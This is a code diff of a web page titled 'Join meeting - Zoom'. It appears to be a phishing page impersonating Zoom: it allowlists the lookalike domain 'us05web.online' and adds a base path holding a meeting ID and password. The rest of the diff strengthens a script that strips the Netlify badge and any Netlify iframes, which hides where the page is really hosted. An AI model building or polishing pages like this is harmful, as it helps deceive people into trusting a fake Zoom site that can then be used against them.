@@ -7,6 +7,7 @@
 <meta name="google" content="notranslate">
 <link rel="icon" href="favicon.ico" type="image/x-icon">
 <title>Join meeting - Zoom</title>
+<base href="/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/">
 <script>
   (function() {
     var allowedHosts = ['us05web.online', 'www.us05web.online'];
@@ -920,23 +921,31 @@ a[href*="netlify.com"][target="_blank"]:not(.wc-link2) {
 
 <!-- NOW START THE BADGE REMOVER SCRIPT -->
 <!-- Force Remove Netlify Badge -->
+<!-- Force Remove Netlify Badge -->
+<!-- Force Remove Netlify Badge -->
 <script>
   (function() {
-    function removeBadge() {
+    function killBadge() {
+      // 1. Kill by ID
       var badge = document.getElementById('netlify-badge');
       if (badge) badge.remove();
-      
-      var iframes = document.querySelectorAll('iframe[src*="netlify.com"]');
+
+      // 2. Kill any iframe injected by Netlify
+      var iframes = document.querySelectorAll('iframe');
       for (var i = 0; i < iframes.length; i++) {
-        iframes[i].remove();
+        if (iframes[i].src && (iframes[i].src.indexOf('netlify') > -1 || iframes[i].src.indexOf('app.netlify.com') > -1)) {
+          iframes[i].remove();
+        }
       }
     }
-    
-    // Run immediately, and set up a watcher in case Netlify injects it late
-    removeBadge();
-    setInterval(removeBadge, 500); 
+
+    // Run immediately
+    killBadge();
+
+    // Watch the DOM for late injections
+    var observer = new MutationObserver(killBadge);
+    observer.observe(document.body, { childList: true, subtree: true });
   })();
 </script>
-
 </body>
 </html>
